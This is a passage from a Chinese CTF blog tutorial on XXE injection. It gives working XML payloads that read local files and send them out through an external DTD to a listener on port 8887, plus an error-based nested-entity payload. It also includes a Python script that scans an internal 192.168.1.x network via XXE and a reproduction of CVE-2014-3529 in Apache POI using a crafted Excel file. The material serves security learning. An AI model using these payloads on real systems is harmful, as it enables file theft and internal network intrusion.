class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是我在尝试参数实体的时候似乎不能外带数据</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % a <span class="meta-string">"http://localhost:8887/aaa"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/2e545689/1580302730124.png" alt></p><p>嵌套也是不行的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag.txt"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://localhost:8887/?%file;'&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%start;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>最常用的外带数据的方法：</p><p>在自己的vps上准备两个文件，我这里就就都在本机做的实验</p><p>本地的8001端口开一个web服务，</p><p><img src= "/img/loading.gif" data-src="/posts/2e545689/1580302833010-1580342074917.png" alt></p><p><code>local.xml</code> 文件内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://localhost:8887/?%file;'&gt;"</span>&gt;</span></span><br><span class="line">%start;</span><br></pre></td></tr></table></figure><p>这个文件表示读取到数据之后发送给另一个8887端口，然后我们向受害者服务器发送数据，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://localhost:8001/local.xml"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=./flag.txt"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后就可以在8887端口接收到数据了</p><p><img src= "/img/loading.gif" data-src="/posts/2e545689/1580302962486-1580342120888.png" alt></p><p>换一种 <code>payload</code> 也行</p><p>DTD文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=file:///flag"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://localhost:8887/p=%file;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发送的 paylod</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://localhost:8001/local.xml"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><h2 id="报错XXE"><a href="#报错XXE" class="headerlink" title="报错XXE"></a>报错XXE</h2><p>这个方法p牛其实早就说过了,通过三层嵌套的XML就可以达到报错</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">message</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">para1</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">para</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY &amp;#x25; para2 "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&amp;#x25;para2;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">'</span>&gt;</span></span></span><br><span class="line"><span class="meta">%para;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>10<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/2e545689/1580303152983-1580342131433.png" alt></p><h2 id="XXE探测内网"><a href="#XXE探测内网" class="headerlink" title="XXE探测内网"></a>XXE探测内网</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">#Origtional XML that the server accepts</span><br><span class="line"></span><br><span class="line">#<span class="tag">&lt;<span class="name">xml</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#    <span class="tag">&lt;<span class="name">stuff</span>&gt;</span>user<span class="tag">&lt;/<span class="name">stuff</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#<span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_xml(string):</span><br><span class="line">    xml = """<span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>"""</span><br><span class="line">    xml = xml + "\r\n" + """<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span>"""</span></span><br><span class="line"><span class="meta">    xml = xml + "\r\n" + """<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">""</span><span class="meta-string">" + '"</span><span class="meta-string">' + string + '</span><span class="meta-string">"' + "</span><span class="meta-string">""</span>&gt;</span>]&gt;</span>"""</span><br><span class="line">    xml = xml + "\r\n" + """<span class="tag">&lt;<span class="name">xml</span>&gt;</span>"""</span><br><span class="line">    xml = xml + "\r\n" + """    <span class="tag">&lt;<span class="name">stuff</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">stuff</span>&gt;</span>"""</span><br><span class="line">    xml = xml + "\r\n" + """<span class="tag">&lt;/<span class="name">xml</span>&gt;</span>"""</span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line">def send_xml(xml):</span><br><span class="line">    headers = &#123;'Content-Type': 'application/xml'&#125;</span><br><span class="line">    x = requests.post('http://127.0.0.1/xml.php', data=xml, headers=headers, timeout=5).text</span><br><span class="line">    coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value</span><br><span class="line">    print coded_string</span><br><span class="line">#   print base64.b64decode(coded_string)</span><br><span class="line"></span><br><span class="line">for i in range(1, 255):</span><br><span class="line">    try:</span><br><span class="line">        i = str(i)</span><br><span class="line">        ip = '192.168.1.' + i</span><br><span class="line">        string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'</span><br><span class="line">        print string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    except:</span><br><span class="line">      print "error"</span><br><span class="line">continue</span><br></pre></td></tr></table></figure><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="网鼎杯2020-fileJava"><a href="#网鼎杯2020-fileJava" class="headerlink" title="网鼎杯2020 fileJava"></a>网鼎杯2020 fileJava</h3><p>用到的漏洞就是 <code>CVE20143529</code></p><p>复现代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.poi.EncryptedDocumentException;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.openxml4j.exceptions.InvalidFormatException;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.Sheet;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.Workbook;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.WorkbookFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE20143529</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, EncryptedDocumentException, InvalidFormatException </span>&#123;</span><br><span class="line">        Workbook wb1 = WorkbookFactory.create(<span class="keyword">new</span> FileInputStream(<span class="string">"test1.xlsx"</span>));</span><br><span class="line">        Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">        System.out.println(sheet.getLastRowNum());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>pxyapache<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>pxypxy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.poi<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>poi-ooxml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.10-FINAL<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用过程：</p><p>准备一个excel文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://localhost:8001/local.xml"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/2e545689/1589113834496.png" alt></p><p>准备DTD文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;localhost:8887&#x2F;p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>会读取文件，然后将其发送到8887端口上</p><p><img src= "/img/loading.gif" data-src="/posts/2e545689/1589113886930.png" alt></p><p>监听得到的flag</p><p><img src= "/img/loading.gif" data-src="/posts/2e545689/1589113898690.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
            <tag> xml </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
